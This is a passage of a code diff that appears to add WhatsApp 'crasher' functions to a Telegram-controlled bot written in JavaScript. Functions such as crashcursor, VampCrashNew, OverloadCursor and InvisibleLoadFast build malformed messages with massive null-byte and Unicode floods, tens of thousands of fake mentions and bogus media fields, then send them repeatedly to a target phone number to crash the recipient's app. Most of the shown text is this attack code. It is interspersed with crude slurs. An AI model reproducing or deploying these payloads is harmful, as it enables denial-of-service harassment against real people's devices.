ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ါ.repeat(1000)\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
+      }
+    ],
+    contextInfo: {
+      mentionedJid: ['0@s.whatsapp.net'],
+    },
+  },
+},
+body: { text: 'ꦾ𝚂̸̴̸̡⃨̺̘͚̝͙̪̘͋̓̾͆̓̔͝͝𝙴̴̴̵̡⃨̼̠͉͉͙͖̠̈́̚̚͘͝͝͠𝙲̴̴̸⃨̺̺̫͕̼͎͇͙̿͊͊̔̓̀͝͝͠𝚁̸̸̴⃨̫̝̦͔͓͎͚͚̿̐͒͋̓͊̒̕͝𝙴̸̵̴⃨̼̝͓̺̙̪͚̘̝̓̓̽̓̽̽͑̕𝚃̸̵̵⃨̫͖̙̟͍̦̪͛̓̐̓͌͐̀͘͠ ཉꦾ' + ui + jids},
+  contextInfo: {
+    mentionedJid: ['0@s.whatsapp.net'],
+    mentions: ['0@s.whatsapp.net'],
+      },
+        footer: { text: '#LACOSANOSTRA' },
+          nativeFlowMessage: {},
+         contextInfo: {
+          mentionedJid: ["0@s.whatsapp.net", ...Array.from({
+           length: 30000
+          }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+          forwardingScore: 1,
+          isForwarded: true,
+          fromMe: false,
+          participant: "0@s.whatsapp.net",
+          remoteJid: "status@broadcast",
+         },
+groupMentions: [
+{
+  groupJid: "1@broadcast",
+  groupSubject: virtex // PASTIKAN BUTTON SUDAH DITETAPKAN
+}
+],
+    isForwarded: true,
+    quotedMessage: {
+      callLogMesssage: {
+        isVideo: true,
+        callOutcome: "7",
+        durationSecs: "0",
+        callType: "REGULAR",
+        participants: [{
+          jid: "0@s.whatsapp.net",
+          callOutcome: "7"
+        }]
+      },
+        interactiveResponseMessage: {
+            body: {
+                text: "Sent",
+                format: "EXTENSIONS_7"
+            },
+            nativeFlowResponseMessage: {
+                name: "custom_message",
+                paramsJson: `{
+"screen_2_OptIn_0": true,
+"screen_2_OptIn_1": true,
+"screen_1_Dropdown_0": "HKC-QI-0",
+"screen_0_Dropdown_1": "HK-9999",
+"screen_1_DatePicker_1": "1028995200000",
+"screen_1_TextInput_2": "SCT-COMPANY@GLITCH.com",
+"screen_1_TextInput_4": "https://www.google.com/",
+"screen_1_TextInput_5": "https://api.whatsapp.com/send?phone=+🪭&text="+"@0".repeat(1000),       
+"screen_1_TextInput_3": "94643116",
+"screen_0_TextInput_0": "${" \u0003".repeat(55000)}",
+"screen_0_TextInput_1": "HK-3001",
+"screen_0_TextInput_2": "HK-6666",
+"screen_0_TextInput_3": "HK-3004",
+"screen_4_TextInput_8": "0x80048820",
+"screen_0_TextInput_4": "HK-3005",
+"screen_0_TextInput_5": "HK-3000",
+"screen_0_TextInput_6": "HK-3002",
+"screen_0_TextInput_7": "HK-3005",
+"screen_0_TextInput_8": "HK-3006",
+"screen_0_TextInput_9": "HK-3008",
+"screen_0_TextInput_10": "HK-1001",
+"screen_1_TextInput_0": "HK-2002",
+"screen_2_TextInput_0": "HK-5005",
+"screen_3_TextInput_0": "HK-3003",
+"screen_5_TextInput_0": "Doomsday-2024",
+"screen_0_Dropdown_2": "0.0.9_#AmpasWKWK",
+"screen_0_Dropdown_3": "HK-0001",
+"screen_0_Dropdown_4": "Doomsday-2024",
+"screen_3_EmojiBombCrash_004": "🪭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(10000),
+"flow_token": "AAAAAA_TOKEN_SECRET_CONTRA_SecretCompany_Lakuning_Mati.BANGKITKembali"
+}`,
+                version: 3
+            }
+        }
+    },
+  messageVersion: 1,
+},
+},
+},
+},
+  Ptcp ? {
+    participant: { jid: target, count: 1 }
+   } : {}
+  );
+}
+console.log(chalk.red("Crasher Sending Bug"));
+}
+
+async function crashcursor(target, ptcp = true) {
+const stanza = [
+{
+attrs: { biz_bot: '1' },
+tag: "bot",
+},
+{
+attrs: {},
+tag: "biz",
+},
+];
+
+let messagePayload = {
+viewOnceMessage: {
+message: {
+listResponseMessage: {
+title: "Bruh your stupid" + "@0".repeat(1000),
+listType: 2,
+singleSelectReply: {
+    selectedRowId: "🩸"
+},
+contextInfo: {
+stanzaId: zephy.generateMessageTag(),
+participant: "0@s.whatsapp.net",
+remoteJid: "status@broadcast",
+mentionedJid: [target, "0@s.whatsapp.net"],
+quotedMessage: {
+                buttonsMessage: {
+                    documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                        fileLength: "9999999999999",
+                        pageCount: 3567587327,
+                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                        fileName: "#ZephyrineTrashDex",
+                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1735456100",
+                        contactVcard: true,
+                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
+                    },
+                    contentText: "- Kami Yo \"👋\"",
+                    footerText: "© #trashdexx",
+                    buttons: [
+                        {
+                            buttonId: "\u0000".repeat(850000),
+                            buttonText: {
+                                displayText: "#trashdexx"
+                            },
+                            type: 1
+                        }
+                    ],
+                    headerType: 3
+                }
+},
+conversionSource: "porn",
+conversionData: crypto.randomBytes(16),
+conversionDelaySeconds: 9999,
+forwardingScore: 999999,
+isForwarded: true,
+quotedAd: {
+advertiserName: " x ",
+mediaType: "IMAGE",
+jpegThumbnail: tdxlol,
+caption: " x "
+},
+placeholderKey: {
+remoteJid: "0@s.whatsapp.net",
+fromMe: false,
+id: "ABCDEF1234567890"
+},
+expiration: -99999,
+ephemeralSettingTimestamp: Date.now(),
+ephemeralSharedSecret: crypto.randomBytes(16),
+entryPointConversionSource: "kontols",
+entryPointConversionApp: "kontols",
+actionLink: {
+url: "t.me/xzhechi",
+buttonTitle: "konstol"
+},
+disappearingMode:{
+initiator:1,
+trigger:2,
+initiatorDeviceJid: target,
+initiatedByMe:true
+},
+groupSubject: "kontol",
+parentGroupJid: "kontolll",
+trustBannerType: "kontol",
+trustBannerAction: 99999,
+isSampled: true,
+externalAdReply: {
+title: "! Zhee! - \"𝗋34\" 🩸",
+mediaType: 2,
+renderLargerThumbnail: false,
+showAdAttribution: false,
+containsAutoReply: false,
+body: "© running since 2020 to 20##?",
+thumbnail: tdxlol,
+sourceUrl: "go fuck yourself",
+sourceId: "dvx - problem",
+ctwaClid: "cta",
+ref: "ref",
+clickToWhatsappCall: true,
+automatedGreetingMessageShown: false,
+greetingMessageBody: "kontol",
+ctaPayload: "cta",
+disableNudge: true,
+originalImageUrl: "konstol"
+},
+featureEligibilities: {
+cannotBeReactedTo: true,
+cannotBeRanked: true,
+canRequestFeedback: true
+},
+forwardedNewsletterMessageInfo: {
+newsletterJid: "120363422829379004@newsletter",
+serverMessageId: 1,
+newsletterName: `- # Nando Ni Memek   - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+contentType: 3,
+accessibilityText: "kontol"
+},
+statusAttributionType: 2,
+utm: {
+utmSource: "utm",
+utmCampaign: "utm2"
+}
+},
+description: "by : # Azrael Inc"
+},
+messageContextInfo: {
+messageSecret: crypto.randomBytes(32),
+supportPayload: JSON.stringify({
+version: 2,
+is_ai_message: true,
+should_show_system_message: true,
+ticket_id: crypto.randomBytes(16),
+}),
+},
+}
+}
+}
+
+await zephy.relayMessage(target, messagePayload, {
+additionalNodes: stanza,
+participant: { jid: target, count: 1 }
+});
+}
+  
+// Fungsi untuk menghapus semua pesan dari target
+  async function clearChat(target) {
+    try {
+      // Format nomor ke format JID
+      const targetJid = targetNumber.includes("@s.whatsapp.net")
+        ? targetNumber
+        : `${target}@s.whatsapp.net`;
+
+      // Periksa apakah target ada di daftar kontak
+      const chats = zephy.chats.get(targetJid);
+      if (!chats) {
+        console.log("Target chat tidak ditemukan!");
+        return;
+      }
+
+      // Hapus semua pesan di chat target
+      await zephy.modifyChat(targetJid, "delete");
+      console.log(`Semua pesan dengan ${target} telah dihapus.`);
+    } catch (error) {
+      console.error("Gagal menghapus chat:", error);
+    }
+  }
+ async function invc2(nomor) {
+     let target = nomor
+     let msg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "The weak Shall Suffer ۞",
+                                hasMediaAttachment: false
+                            },
+                            body: {
+                                text: "𝐍𝐚𝐧𝐝𝐨 𝐗𝐜𝐫𝐚𝐬𝐡𝐞𝐫"
+                            },
+                            nativeFlowMessage: {
+                                messageParamsJson: "",
+                                buttons: [{
+                                        name: "single_select",
+                                        buttonParamsJson: "z"
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "{}"
+                                    }
+                                ]
+                            }
+                        }
+                    }
+                }
+            }, {});
+
+            await zephy.relayMessage(target, msg.message, {
+                messageId: msg.key.id,
+                participant: { jid: target, count: 1 }
+            });
+        }
+
+// Function NusantaraBetaCrasher yang disesuaikan
+async function VampCrashNew(sock, target) {
+  const crashandro = "ु".repeat(90000);
+  const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
+      groupMentionedMessage: {
+          message: {
+              interactiveMessage: {
+                  header: {
+                      documentMessage: {
+                          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+                          mimetype: "application/json",
+                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                          fileLength: "999999999999",
+                          pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                          fileName: fileName,
+                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+                          mediaKeyTimestamp: "1715880173"
+                      },
+                      hasMediaAttachment: true
+                  },
+                  body: { text: bodyText },
+                  nativeFlowMessage: {
+                      messageParamsJson: JSON.stringify({
+                          name: "galaxy_message",
+                          flow_action: "navigate", 
+                          flow_action_payload: {screen: "CTZ_SCREEN"},
+                          flow_cta: "🚀",
+                          flow_id: "Apocalypse BvG Crash",
+                          flow_message_version: "9.903",
+                          flow_token: " Nando"
+                      })
+                  },
+                  contextInfo: {
+                      mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                      groupMentions: [{ groupJid: "1@newsletter", groupSubject: " UNiX " }]
+                  }
+              }
+          }
+      }
+  }), { userJid: target });
+
+  try {
+      for (let i = 1; i <= 10; i++) {
+          console.log(chalk.white.bold(`\n[${i}] Mengirim VampCrash ke ${target}`));
+          
+          const msg = await genMsg(`${crashandro}️`, "𑇂𑆵𑆴𑆿".repeat(9999));
+          const result = await sock.relayMessage(target, msg.message, { 
+              participant: { jid: target, count: 1 },
+              messageId: msg.key.id 
+          });
+
+          // Hapus pesan setelah dikirim
+          if (result?.key) {
+              await sock.sendMessage(target, { delete: result.key });
+          }
+          
+          console.log(chalk.green.bold(`[√] Berhasil mengirim VampCrash ${i}/8`));
+
+          // Tambah jeda kecil antar pengiriman
+          await new Promise(resolve => setTimeout(resolve, 500));
+      }
+      console.log(chalk.blue.bold(`\n[*] Semua 10 bug berhasil dikirim ke ${target}`));
+  } catch (error) {
+      console.error(chalk.red.bold(`\n[!] Terjadi error: ${error}`));
+      throw error;
+  }
+}
+
+async function OverloadCursor(target, ptcp = true) {
+  const virtex = [
+    {
+      attrs: { biz_bot: "1" },
+      tag: "bot",
+    },
+    {
+      attrs: {},
+      tag: "biz",
+    },
+  ];
+  let messagePayload = {
+    viewOnceMessage: {
+      message: {
+        listResponseMessage: {
+          title:
+            "Apocalypse BvG New" + "ꦽ".repeat(1000),
+          listType: 5,
+          singleSelectReply: {
+            selectedRowId: "mati",
+          },
+          contextInfo: {
+            virtexId: zephy.generateMessageTag(),
+            participant: "13135550002@s.whatsapp.net",
+            mentionedJid: ["13135550002@s.whatsapp.net"],
+            quotedMessage: {
+              buttonsMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                  mimetype:
+                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                  fileLength: "9999999999999",
+                  pageCount: 1316134911,
+                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                  fileName: "Z?" + "\u0000".repeat(1000),
+                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                  directPath:
+                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1726867151",
+                  contactVcard: true,
+                  jpegThumbnail: tdxlol,
+                },
+                hasMediaAttachment: true,
+                contentText: 'Apocalypse Crasherr"🕷️"',
+                footerText: "|| The Weak Shall Sufferꦽ",
+                buttons: [
+                  {
+                    buttonId: "\u0000".repeat(1000),
+                    buttonText: {
+                      displayText: "Ampas?" + "\u0000".repeat(1000),
+                    },
+                    type: 3,
+                  },
+                  {
+                    buttonId: "\u0000".repeat(1000),
+                    buttonText: {
+                      displayText: "Ampas?" + "\u0000".repeat(1000),
+                    },
+                    type: 3,
+                  },
+                  {
+                    buttonId: "\u0000".repeat(220000),
+                    buttonText: {
+                      displayText: "Ampas?" + "\u0000".repeat(9999),
+                    },
+                    type: 3,
+                  },
+                ],
+                viewOnce: true,
+                headerType: 3,
+              },
+            },
+            conversionSource: "porn",
+            conversionData: crypto.randomBytes(16),
+            conversionDelaySeconds: 9999,
+            forwardingScore: 999999,
+            isForwarded: true,
+            quotedAd: {
+              advertiserName: " x ",
+              mediaType: "IMAGE",
+              jpegThumbnail: tdxlol,
+              caption: " x ",
+            },
+            placeholderKey: {
+              remoteJid: "13135550002@s.whatsapp.net",
+              fromMe: false,
+              id: "ABCDEF1234567890",
+            },
+            expiration: -99999,
+            ephemeralSettingTimestamp: Date.now(),
+            ephemeralSharedSecret: crypto.randomBytes(16),
+            entryPointConversionSource: "❤️",
+            entryPointConversionApp: "💛",
+            actionLink: {
+              url: "t.me/haunteddevv",
+              buttonTitle: "Developer",
+            },
+            disappearingMode: {
+              initiator: 1,
+              trigger: 2,
+              initiatorDeviceJid: target,
+              initiatedByMe: true,
+            },
+            groupSubject: "😼",
+            parentGroupJid: "😽",
+            trustBannerType: "😾",
+            trustBannerAction: 99999,
+            isSampled: true,
+            externalAdReply: {},
+            featureEligibilities: {
+              cannotBeReactedTo: true,
+              cannotBeRanked: true,
+              canRequestFeedback: true,
+            },
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "120363274419384848@newsletter",
+              serverMessageId: 1,
+              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+              contentType: 3,
+              accessibilityText: "kontol",
+            },
+            statusAttributionType: 2,
+            utm: {
+              utmSource: "utm",
+              utmCampaign: "utm2",
+            },
+          },
+          description: "@13135550002".repeat(2999),
+        },
+        messageContextInfo: {
+          messageSecret: crypto.randomBytes(32),
+          supportPayload: JSON.stringify({
+            version: 2,
+            is_ai_message: true,
+            should_show_system_message: true,
+            ticket_id: crypto.randomBytes(16),
+          }),
+        },
+      },
+    },
+  };
+  let sections = [];
+  for (let i = 0; i < 1; i++) {
+    let largeText = "\u0000".repeat(11999);
+    let deepNested = {
+      title: `Section ${i + 1}`,
+      highlight_label: `Highlight ${i + 1}`,
+      rows: [
+        {
+          title: largeText,
+          id: `\u0000`.repeat(999),
+          subrows: [
+            {
+              title: `\u0000`.repeat(999),
+              id: `\u0000`.repeat(999),
+              subsubrows: [
+                {
+                  title: `\u0000`.repeat(999),
+                  id: `\u0000`.repeat(999),
+                },
+                {
+                  title: `\u0000`.repeat(999),
+                  id: `\u0000`.repeat(999),
+                },
+              ],
+            },
+            {
+              title: `\u0000`.repeat(999),
+              id: `\u0000`.repeat(999),
+            },
+          ],
+        },
+      ],
+    };
+    sections.push(deepNested);
+  }
+  let listMessage = {
+    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
+    sections: sections,
+  };
+  let msg = generateWAMessageFromContent(
+    target,
+    proto.Message.fromObject({
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+          },
+          interactiveMessage: proto.Message.InteractiveMessage.create({
+            contextInfo: {
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: [target],
+              isForwarded: true,
+              forwardingScore: 999,
+            },
+            body: proto.Message.InteractiveMessage.Body.create({
+              text: 'Nando Suka Tobrut !!' + "ꦽ".repeat(900000),
+            }),
+            footer: proto.Message.InteractiveMessage.Footer.create({
+              buttonParamsJson: JSON.stringify(listMessage),
+            }),
+            header: proto.Message.InteractiveMessage.Header.create({
+              buttonParamsJson: JSON.stringify(listMessage),
+              subtitle: "Ndoo crash" + "\u0000".repeat(9999),
+              hasMediaAttachment: false,
+            }),
+            nativeFlowMessage:
+              proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                buttons: [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: "JSON.stringify(listMessage)",
+                  },
+                  {
+                    name: "call_permission_request",
+                    buttonParamsJson: "{}",
+                  },
+                  {
+                    name: "single_select",
+                    buttonParamsJson: "JSON.stringify(listMessage)",
+                  },
+                ],
+              }),
+          }),
+        },
+      },
+    }),
+    { userJid: target }
+  );
+  await zephy.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target, count: 1 },
+  });
+  console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙱𝚄𝚃𝚃𝙾𝙽 𝚃𝙾 ${target}`);
+  await zephy.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target, count: 1 },
+  });
+  await zephy.relayMessage(target, messagePayload, {
+    additionalNodes: virtex,
+    participant: { jid: target, count: 1 },
+  });
+  console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙲𝚄𝚁𝚂𝙾𝚁 𝚃𝙾 ${target}`);
+}
+async function InvisibleLoadFast(target) {
+      try {
+        let message = {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2,
+              },
+              interactiveMessage: {
+                contextInfo: {
+                  mentionedJid: [target],
+                  isForwarded: true,
+                  forwardingScore: 999,
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: target,
+                  },
+                },
+                body: {
+                  text: "️X̸̡̢̧̹͔̣̻̜̬̻̘͂͐̓͆̕Z̶̢̫̜̪͇͖͙̓̈́́͜͜ͅ️Ĉ̵̢̢̱̞̻̣͕͈̱̥̤̳͉R̴͇͌̀̆̍̽͝͠ͅ️Ą̵̘̥͉̘͖̱̥̺̿̀̈̒̂̅̀̅̈́̓̏͊͘͝️S̴̨̛͇̺͇͕̟̘͎̗͖̙͍̭̞͇̒͆̀͝Ḩ̶̳̣̮̻̪̜͍̹̭͓͍̳̼̈́̅́̄̍̀͐́̊̽͌̊̂͂͠͝͝ ️N̴̟̬̠̣͍̹̜̠̘̮͎̥̜̳̖̋͋͛̆́̂̀̅̓̕ͅͅI̸̡̛̳͌̉͋͐͒̍ B̴̢̠̋̊͑̈̾̑̊͒͗̽O̸̙͙̺̰͚͎̙͔̦͇͗̒̋͛̄͐̓̽̄͛́͂̀̑̕ͅͅͅ️S̴̨̛͇̺͇͕̟̘͎̗͖̙͍̭̞͇̒͆̀͝️S̴̨̛͇̺͇͕̟̘͎̗͖̙͍̭̞͇̒͆̀͝" + "\u0000".repeat(900000),
+                },
+                nativeFlowMessage: {
+                  buttons: [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "call_permission_request",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                  ],
+                },
+              },
+            },
+          },
+        };
+
+        await zephy.relayMessage(target, message, {
+          participant: { jid: target, count: 1 },
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
+// --- Jalankan Bot ---
+bot.launch();
+console.log("Telegram bot is running...");
